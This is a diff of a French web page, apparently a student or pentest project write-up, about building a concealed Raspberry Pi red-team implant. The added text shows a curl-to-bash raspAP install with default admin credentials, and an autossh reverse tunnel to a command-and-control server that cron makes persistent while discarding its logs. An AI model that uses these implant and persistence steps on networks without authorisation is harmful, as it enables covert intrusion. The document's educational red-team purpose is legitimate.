@@ -2,6 +2,8 @@ import React from 'react';
 import Hide from "../img/hide_raspberry.jpg"
 import Methodo from "../img/methodo.jpg"
 import KaliRaspberry from "../img/kali_raspberry.png"
+import Raspap01 from "../img/raspap_01.png"
+import Raspap02 from "../img/raspap_02.png"
 
 
 class Redteam extends React.Component {
@@ -12,22 +14,22 @@ class Redteam extends React.Component {
         <h1>Redteam</h1>
    
         <hr/>
-        <p className="tabulation">Une nouvelle tendance émerge du côté des attaques informatiques, les techniques d’intrusion se professionnalisent, s’industrialisent et s’étendent dans le temps. Là où des « amateurs » n’avaient qu’à exécuter un script sur un système vulnérable autrefois, des équipes expérimentées peuvent passer des mois sur une seule et même cible aujourd’hui, <strong>APT (Advanced Persitent Threat).</strong><br/><br/>
+        <p className="tabulation">Une nouvelle tendance émerge du côté des attaques informatiques, les techniques d’intrusion se professionnalisent, s’industrialisent et s’étendent dans le temps. Là où des « amateurs » n’avaient qu’à exécuter un script sur un système vulnérable autrefois, des équipes expérimentées peuvent aujourd’hui passer des mois sur une seule et même cible, <strong>APT (Advanced Persitent Threat).</strong></p>
 
-        Pour s'adapter les entreprises de sécurité propose depuis peu une nouvelle approche dans la réalisation d’un test d’intrusion : L’approche <strong>RedTeam</strong>. Dans cette approche, l’objectif de l’équipe attaquante est de passer d'une position de personne extérieure à l’entreprise jusqu’à la réalisation d’une ou plusieurs actions critiques au sein du SI ciblé. Par rapport à un pentest il s'agit généralement d'une mission d'une durée beaucoup plus longue et avec plus de techniques possibles (ex: phishing, intrusion physique).    
-        </p>
+        <p className="tabulation">Pour s'adapter les entreprises de sécurité propose depuis peu une nouvelle approche dans la réalisation d’un test d’intrusion : le <strong>RedTeam</strong>. <br/><br/>L’objectif est de dérouler un scénario complet d'attaque depuis l'externe jusqu’à l'interne et la capacité d'effectuer des actions critiques au sein du SI ciblé. Par rapport à un pentest traditionnel la durée est généralement plus longue et les moyens, plus variés (ex: phishing des employés, intrusions physiques dans le locaux).</p>
 
         <br/>
         <br/>
 
         <h2>Contexte</h2>
-        <p className="tabulation">L'objectif de notre projet de Redteam est de créer un implant qui une fois sur le réseau d'un client se reconnecterait automatiquement à notre serveur interne, avec à disposition toute la boite à outils de pentest. Cela représenterait la phase de compromission initiale dans le schéma de redteam suivant: <br/>
+        <p className="tabulation">Notre projet consiste à créer un implant qu'il suffirait de déposer chez un client pour avoir un accès à distance à leur réseau interne. Cela représenterait la phase de compromission initiale dans le schéma de redteam suivant: <br/>
+
         <img id="methodoredteam" src={Methodo} alt="méthodologie redteam"/>
         <br/>  
 
-        Un scénario de Redteam possible serait de pénétrer dans une société cliente en se déguisant et de placer l'implant sur le réseau, afin d'obtenir à distance un accès à leur réseau via une connexion OpenVPN ou un tunnel SSH inversé.<br/><br/>  
+        Un scénario possible serait de pénétrer dans la société et d'y dissimuler l'implant pour obtenir notre accès à distance via une connexion OpenVPN ou un tunnel SSH inversé.<br/><br/>  
 
-        Des outils tels que <strong>la LAN Turtle</strong> existent déjà mais l'on souhaiterait avoir le contrôle total de nos outils. Plusieurs méthodes doivent être implémentées au cas où le pare-feu du client bloquerait certains flux sortants. L'implant doit également avoir une méthode alternative pour se connecter au cas où leurs règles de pare-feu bloqueraient le trafic, une configuration sans fil pour l'appareil est donc à envisager.
+        Des outils tels que la <strong>LAN Turtle</strong> existent déjà mais l'on souhaiterait avoir le contrôle total de nos outils. Plusieurs méthodes doivent être implémentées au cas où le pare-feu du client bloquerait certains flux sortants. Notre backdoor doit également avoir une méthode alternative pour se connecter au cas où leurs règles de pare-feu bloqueraient le trafic, une configuration sans fil pour l'appareil est donc à envisager.
         </p>
 
         <img id="kaliraspberry" src={KaliRaspberry} alt="kali raspberry"/>
@@ -37,13 +39,13 @@ class Redteam extends React.Component {
         Plusieurs appareils peuvent convenir, les critères principaux étant sa fiabilité, sa légèreté, sa taille, sa rapidité et son coût:
             <ul>
                 <li>l'appareil doit être <strong>petit</strong> (facile à dissimuler)</li>
-                <li>possibilité d'utiliser un <strong>tunnel SSH inverse persistant</strong> et/ou <strong>OpenVPN</strong> pour le C&C</li>
+                <li>possibilité d'utiliser un <strong>tunnel SSH inverse persistant</strong> et/ou <strong>OpenVPN</strong> pour le serveur de contrôle</li>
                 <li>espace de <strong>stockage</strong> (au moins 32 Go)</li>
                 <li>matériel <strong>rapide</strong></li>
                 <li><strong>faible coût</strong> (en cas de destruction ou de vol)</li>
-                <li>possibilité d'ajouter des modules pour la <strong>connexion sans fil</strong></li>
+                <li>possibilité d'ajouter des modules éventuels</li>
             </ul>
-        Il existe de nombreux appareils comme le Hardkernel ODROID-N2, ou encore le Beaglebone Black mais pour le prix la simplicité et les autres critères, on préférera utiliser la <strong>Raspberry Pi 4.</strong></div>
+        Il existe de nombreux appareils comme le Hardkernel ODROID-N2 ou encore le Beaglebone Black mais au vu du prix, de la simplicité, et des autres critères, on préférera utiliser une <strong>Raspberry Pi.</strong></div>
 
         <br/>
 
@@ -60,14 +62,14 @@ class Redteam extends React.Component {
         <br/>
 
         <h2>Système d'exploitation</h2>
-        <p className="tabulation">Comme système d'exploitation, on retiendra la distribution <strong>Kali Linux</strong> car elle possède déjà beaucoup d'outils de pentest, pas besoin d'installation et c'est simple à utiliser pour tous les pentesters.</p>
+        <p className="tabulation">Comme système d'exploitation, on retiendra la distribution <strong>Kali Linux</strong> car elle dispose déjà d'outils de pentest intégrés, pas besoin d'installation et c'est simple à utiliser pour tous les pentesters.</p>
         
         <br/>
 
         <h2>Wifi</h2>
         <p className="tabulation">La Raspberry Pi 4 dispose déjà d'une carte sans fil intégrée (sans fil 2,4 GHz et 5,0 GHz IEEE 802.11ac), et gère l'<strong>injection de paquets</strong> et <strong>le mode moniteur</strong> (contrairement à la Pi 3). Un autre adaptateur sans fil permettrait d'avoir une meilleure portée lors d'attaques sans fil.
 
-        Un adaptateur sans fil doté d'un chipset RT5370 serait un bon choix, en plus de prendre en charge le mode moniteur, et l'injection de paquets avec des outils comme <strong>Aireplay-ng</strong>, il a une large bande de fréquences utilisables. Ainsi on peut se connecter à un adaptateur via <strong>hostapd</strong>et utiliser l'autre adaptateur afin de réaliser les attaques.</p>
+        Un adaptateur sans fil doté d'un <strong>chipset RT5370</strong> serait un bon choix, en plus de prendre en charge le mode moniteur, et l'injection de paquets avec des outils comme <strong>Aireplay-ng</strong>, il a une large bande de fréquences utilisables. Ainsi on peut se connecter à un adaptateur via <strong>hostapd</strong>et utiliser l'autre adaptateur afin de réaliser les attaques.</p>
         
         <br/>
 
@@ -94,7 +96,7 @@ class Redteam extends React.Component {
 
         <div>
           <h4>Pour Windows</h4>
-          Avec un adaptateur microSD vers USB connectez la carte MicroSD à votre système Windows.<br/>
+          Avec un adaptateur MicroSD vers USB connectez la carte MicroSD à votre système Windows.<br/>
           Décompressez l'archive.<br/>
           Utilisez Win32DiskImager ou Rufus pour écrire l'image disque Kali sur la carte MicroSD.<br/>
 
@@ -114,7 +116,35 @@ class Redteam extends React.Component {
 
         <br/>
 
-        <h3>Configurer un point d'accès wifi avec hostpad</h3>
+        <h3>Configurer un point d'accès Wifi</h3>
+
+        <p>On va utiliser l'outil <strong>raspAP</strong> pour mettre en place un point d'accès Wifi sur notre Raspberry :</p>
+
+        <div id="wifi">yes | curl -sL https://install.raspap.com | bash</div>
+
+        <p>Après le reboot, raspAP a mis en place toute la configuration de l'Access Point (AP) !<br/><br/>
+
+        Le <strong>DHCP</strong> distribue des adresses entre 10.3.141.50 et 10.3.141.255. Ainsi lorsqu’un appareil (PC, smartphone, tablette...) se connectera sur ce Wifi, une adresse IP comprise entre ces deux valeurs lui sera fournie.<br/><br/>
+
+        On accède à l’interface d’administration via une page web, en se connectant sur l’adresse IP : 10.3.141.1. On peut le faire en local sur la Raspberry Pi/AP ou depuis une autre machine connectée à l’AP.<br/><br/>
+
+        Les paramètres par défaut sont :</p>
+        <ul>
+          <li>Adresse IP : 10.3.141.1/24  et  169.254.218.244/16</li>
+          <li>Nom d’utilisateur : admin</li>
+          <li>Mot de passe : secret</li>
+          <li>Plage DHCP : 10.3.141.50-255</li>
+          <li>SSID : raspi-webgui</li>
+          <li>Mot de passe du SSID : ChangeMe</li>
+        </ul>
+
+        <img src={Raspap01} alt="raspap_AP"/>
+
+        <p>Dans la liste des points d’accès WiFi, normalement un nouveau nommé raspi-webgui est apparu. (Démo sous Windows 10)</p>
+
+        <img src={Raspap02} alt="raspap_password"/>
+
+        {/* Installation manuelle (sans raspap)
         <div id="wifi">apt-get install hostapd <br/>
         apt-get install pciutils<br/>
 
@@ -219,63 +249,50 @@ class Redteam extends React.Component {
 
         reboot<br/>
         ##You should now see a wireless network named “iphone10” (or whatever named you use)<br/> where you can connect to it with your wpa_passphrase you set earlier. You<br/> should also have Internet too assuming your Raspberry Pi 4 has Internet. Once<br/> connected, you can also SSH into your Raspberry Pi 4.
-        </div>
+        </div> */}
 
-        <h3>Configurer un tunnel reverse shell automatique</h3>
-        <p>Cette section suppose que vous disposez d'un serveur de commande et de contrôle accessible sur Internet et que SSH est activé sur le serveur.</p>   
+        <h3>Configurer un reverse shell automatique</h3>
+        <p>Cette section suppose qu'on dispose d'un serveur de commande et de contrôle (C&C) accessible sur Internet et que SSH est activé. Pour le POC j'ai pour le moment utilisé mon serveur perso</p>   
 
         <div id="wifi">
-        apt-get install autossh <br/>
-        ssh-keygen [Leave all of the settings default] <br/><br/>
+        apt install autossh <br/>
+        ssh-keygen (laisser les paramètres par défaut) <br/><br/>
 
-        scp /root/.ssh/id_rsa.pub root@[C2 IP Address]:/directory/on/C2<br/>
+        scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/<br/>
 
+        [Sur le serveur]
+        Ajouter le contenu id_rsa.pub à ~/.ssh/authorized_keys ou bien créer ce fichier:<br/>
 
-        Append the contents of id_rsa.pub to ~/.ssh/authorized_keys or create this file on the C2 server:<br/>
+        cat id_rsa.pub >> ~/.ssh/authorized_keys<br/>
 
-        [On the C2 server]
+        [Sur la Raspberry]<br/>
+        On va créer une crontab qui exécute autossh après chaque boot et est relancée toutes les 5 min (en cas de coupure)
 
-        cat /directory/to/upload/to/id_rsa.pub >> ~/.ssh/authorized_keys<br/>
-
-        [On the RASPBERRY Pi 4]<br/>
-
-        ssh root@[C2 IP address]<br/>
-        Test “autossh”:<br/>
-
-        autossh -M 11166 -i /root/.ssh/id_rsa -R 6667:localhost:22 root@[C2 IP Address]<br/>
-        If you login to your VPS/C2 server, you should now see port 6667 present after you run a “netstat -antp” command.<br/>
-
-        To have the autossh start at boot, we will create a cronjob that points to a script. First we will create a bash script for our autossh file:<br/>
-
-        nano /bin/autossh-connect.sh<br/>
-        Then we place the autossh command inside the autossh-connect.sh file:<br/><br/>
+        vim /bin/autossh-connect.sh<br/>
 
         #!/bin/bash<br/>
-        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Your C2 Server IP] &<br/><br/>
+        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Server IP] &<br/><br/>
 
-        -N: Do not execute a command on the middleman machine<br/>
-        -f: Drop in the background<br/>
-        &: Execute this command but do not wait for output or an exit code. If this is not added, your machine might hang at boot<br/>
-
-        For the cronjob creation, type the following command:<br/>
+        -N: n'exécute pas de cmd sur la machine intermédiaire<br/>
+        -f: lancé en tache de fond<br/>
+        <br/>
+        chmod u+rwx,g+xr,o+x autossh-connect.sh<br/>
 
         crontab -e<br/>
-        At the bottom of the script (no “#” should be in front of what you are typing), add the following:<br/><br/>
+        
+        Ajouter à la fin du fichier : <br/>
 
         @reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1<br/>
         */5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1<br/>
-        This tells the cron job after reboot to wait 5 seconds and run the <br/>autossh-connect.sh script which will start the autossh process. <br/>
         
-        The 5 seconds was added to ensure the network manager has started first. The “> /dev/null 2>&1” part ensures that no logs are written out to any files as to not take up space. On the second line, the cron job will also try and run every 5 minutes. This is due in case the autossh job gets disconnected or fails for whatever reason.<br/><br/>
+        Voilà, à présent la RaspBerry va se connecter à chaque boot à notre serveur de contrôle<br/> 
+        Exécutez la commande suivante sur le serveur pour obtenir le reverse shell<br/>
 
-        That’s it. Now when your Raspberry Pi 4 starts, it should autossh to your C2 server which will create a local port of 6667 on the C2 server. When you SSH from your attacker system onto the C2 server, you can run the following command on your C2 server to get access to your Raspberry Pi 4 device:<br/><br/>
-
-        ssh localhost -p 6667 [This is ran on the C2 server]
-
+        ssh root@localhost -p 6667 (creds de Kali)
         </div>      
         
         <h3>Configurer un client et un serveur Openvpn</h3>
-        <p className="tabulation">En plus du reverse shell SSH pour accéder à notre Raspberry, il serait également intéressant de configurer l'appareil pour utiliser une connexion OpenVPN inversée sur le port 443 (HTTPS). 
+        <p className="tabulation">En plus du reverse shell SSH pour accéder à notre Raspberry, il serait également intéressant de configurer l'appareil pour utiliser une connexion OpenVPN sur le port 443 (HTTPS). 
         <br/><br/>
         Étant donné que la Raspberry sera probablement déposée à l'arrière d'un switch dans une entreprise, nous ne pourrons pas nous y connecter directement. Par conséquent, la Raspberry doit d'abord sortir par le port 443 vers notre serveur OpenVPN Access Server. Depuis notre machine d'attaque nous devrons également nous connecter au serveur VPN. Cela est une assurance du fait que si le client bloque le port 22 sortant pour SSH, nous aurons une autre option pour se connecter via le port 443 (HTTPS).
         </p>
